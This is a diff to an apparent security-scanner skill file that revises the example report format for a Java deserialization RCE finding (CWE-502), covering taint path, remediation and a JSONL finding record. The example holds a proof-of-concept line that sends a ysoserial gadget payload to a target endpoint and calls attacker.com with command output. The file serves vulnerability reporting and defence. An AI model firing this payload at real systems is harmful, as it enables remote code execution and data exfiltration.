@@ -171,17 +171,22 @@ If no deserialization filter is present and the sink is confirmed reachable → 
 
 ---
 
-## Finding Format Example
+## Finding Format
+
+Follow the canonical format from `copilot-instructions.md`. Example:
 
 ```
 ### [CRITICAL] Deserialization RCE — ObjectInputStream on HTTP Request Body
 
+**ID:** DESERIAL-001
 **File:** `src/main/java/com/example/LegacyApiController.java:61`
-**CWE:** CWE-502
-**CVSS:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+**CWE:** CWE-502 | **OWASP:** A08:2021-Software and Data Integrity Failures
+**CVSS (estimated):** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+**Confidence:** High
+**Skill:** `sast-deserial`
 
 **Taint Path:**
-POST /api/legacy/import → LegacyApiController.importData(request) → ObjectInputStream(request.getInputStream()).readObject()
+`POST /api/legacy/import body (octet-stream)` → `LegacyApiController.importData(HttpServletRequest) (LegacyApiController.java:59)` → `new ObjectInputStream(request.getInputStream()) (LegacyApiController.java:61)` → `ois.readObject() (LegacyApiController.java:62)`
 
 **Vulnerable Code:**
 ```java
@@ -194,26 +199,30 @@ public ResponseEntity<?> importData(HttpServletRequest request) throws Exception
 }
 ```
 
-**Gadget Chains Available:**
-- commons-collections 3.2.1 detected in pom.xml → InvokerTransformer chain → RCE
-- Use ysoserial `CommonsCollections6` payload
+**Why Exploitable:**
+`ObjectInputStream.readObject()` is called on a raw HTTP request body with no allowlist filter. `commons-collections 3.2.1` is on the classpath (confirmed in pom.xml), providing the `InvokerTransformer` gadget chain. An attacker sends a crafted serialized payload to achieve OS-level RCE as the JVM process user.
 
-**Proof of Concept:**
-```
+**Proof-of-Concept:**
+```bash
 java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/$(id)" | \
   curl -X POST http://target/api/legacy/import \
        -H "Content-Type: application/octet-stream" --data-binary @-
 ```
 
 **Remediation:**
-1. Replace with JSON or Protobuf: never deserialize Java objects from HTTP
-2. If Java serialization must be kept, implement `ObjectInputFilter`:
+1. Replace Java serialization with JSON or Protobuf — never deserialize Java objects from HTTP
+2. If serialization must be kept, apply an `ObjectInputFilter` allowlist:
 ```java
 ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
     "maxdepth=10;maxarray=1000;com.example.**;!*");
 ois.setObjectInputFilter(filter);
 ```
-3. Remove commons-collections 3.x from classpath; use 3.2.2+
+3. Upgrade or remove `commons-collections 3.x`; use 3.2.2+
 
-**References:** CWE-502, ysoserial, OWASP A08:2021
+**References:** https://cwe.mitre.org/data/definitions/502.html, OWASP A08:2021
+```
+
+JSONL line (append to `.github/sast-findings.jsonl`):
+```json
+{"id":"DESERIAL-001","skill":"sast-deserial","cwe":"CWE-502","owasp":"A08:2021-Software and Data Integrity Failures","severity":"Critical","confidence":"High","file":"src/main/java/com/example/LegacyApiController.java","line":62,"method":"importData","class":"com.example.LegacyApiController","evidence":"ObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject data = ois.readObject();","sink":"ObjectInputStream.readObject()","source":"HttpServletRequest.getInputStream()","taint_path":[],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Replace with JSON/Protobuf; if serialization required apply ObjectInputFilter allowlist and remove commons-collections 3.x","references":["https://cwe.mitre.org/data/definitions/502.html"],"false_positive_indicators":[],"duplicate_of":null}
 ```
